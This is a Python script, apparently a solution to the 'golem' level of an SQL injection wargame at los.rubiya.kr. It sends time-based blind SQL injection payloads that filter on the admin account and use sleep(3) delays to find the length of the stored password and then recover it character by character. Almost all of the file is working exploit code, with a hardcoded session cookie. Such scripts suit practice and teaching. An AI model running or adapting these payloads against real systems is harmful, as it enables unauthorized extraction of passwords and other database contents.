import requests
import time
import warnings

warnings.filterwarnings("ignore")

url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'

#aaa' union select sleep(3) or '1' = '1
#aaa'||id LIKE 'admin'%26%26 ascii(right(left(pw,1),1)) > 1 %26%26 sleep(3)#
# params = {'pw': 'aaa\' union select sleep(3) or \'1\' = \'1'}
flag = False
PwLen = 0

while(not flag):
	PwLen += 1
	#aaa'||id LIKE 'admin
	#aaa'||id LIKE 'admin' && length(pw)=8 && sleep(3)#
	#aaa'||id LIKE 'admin' && sleep(3) && '1'<'2
	params = {'pw': 'aaa\'||id LIKE \'admin\' && length(pw)<'+str(PwLen)+' && sleep(3)#'}
	cookies = {'PHPSESSID': 'o57d2j04v6hubfn5b17lbru1mo'}
	firstTime = time.time()
	res = requests.get(url, params=params , cookies=cookies)
	#print(res.status_code)
	#print(res.text)
	Time = time.time() - firstTime
	#print(Time)
	flag = Time > 3.0

print(PwLen-1)
cursor = 0
Password = ''
for cursor in range(1,PwLen):
	pw = 0 # 33~126
	flag = False
	while(not flag):
		if(pw >= 127):
			print('err!!')
			break
		
		#ascii(right(left(pw,1),1)) > 1
		params = {'pw': 'aaa\'||id LIKE \'admin\' && ascii(right(left(pw,'+str(cursor)+'),1)) < '+str(pw)+' && sleep(3)#'}
		cookies = {'PHPSESSID': 'o57d2j04v6hubfn5b17lbru1mo'}
		firstTime = time.time()
		res = requests.get(url, params=params , cookies=cookies)
		#print(res.status_code)
		#print(res.text)
		Time = time.time() - firstTime
		#print(Time)
		flag = Time > 3.0
		if(flag):
			Password += chr(pw-1)
		pw += 1
		print(Password)